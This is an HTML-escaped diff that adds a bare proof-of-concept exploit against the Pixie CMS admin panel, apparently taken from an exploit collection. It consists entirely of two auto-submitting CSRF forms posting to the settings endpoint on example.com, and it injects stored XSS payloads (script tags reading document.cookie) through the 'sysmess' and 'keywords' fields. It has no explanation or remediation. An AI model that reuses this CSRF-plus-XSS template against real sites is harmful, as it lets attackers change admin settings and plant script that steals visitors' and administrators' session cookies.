@@ -1,0 +1,28 @@
+&lt;form accept-charset=&quot;UTF-8&quot; action=&quot;http://www.example.com/admin/index.php?s=settings&amp;x=pixie&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;langu&quot; value=&quot;en-gb&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;time_zone&quot; value=&quot;+0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;dstime&quot; value=&quot;no&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;dateformat&quot; value=&quot;%Oe %B %Y, %H:%M&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;rte&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;logs&quot; value=&quot;5&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sysmess&quot; value=&#039;hello message&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;settings_edit&quot; id=&quot;form_addedit_submit&quot; value=&quot;Update&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById(&#039;form_addedit_submit&#039;).click();
+&lt;/script&gt;
+        
+&lt;form accept-charset=&quot;UTF-8&quot; action=&quot;http://www.example.com/admin/index.php?s=settings&amp;x=site&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;sitename&quot; value=&quot;Pixie&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;http://host/&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;default&quot; value=&quot;blog/&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;keywords&quot; value=&#039;key1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_auth&quot; value=&quot;sute author&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;site_cright&quot; value=&quot;copyright&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;cleanurls&quot; value=&quot;yes&quot; /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;settings_edit&quot; id=&quot;form_addedit_submit&quot; value=&quot;Update&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById(&#039;form_addedit_submit&#039;).click();
+&lt;/script&gt;
+        
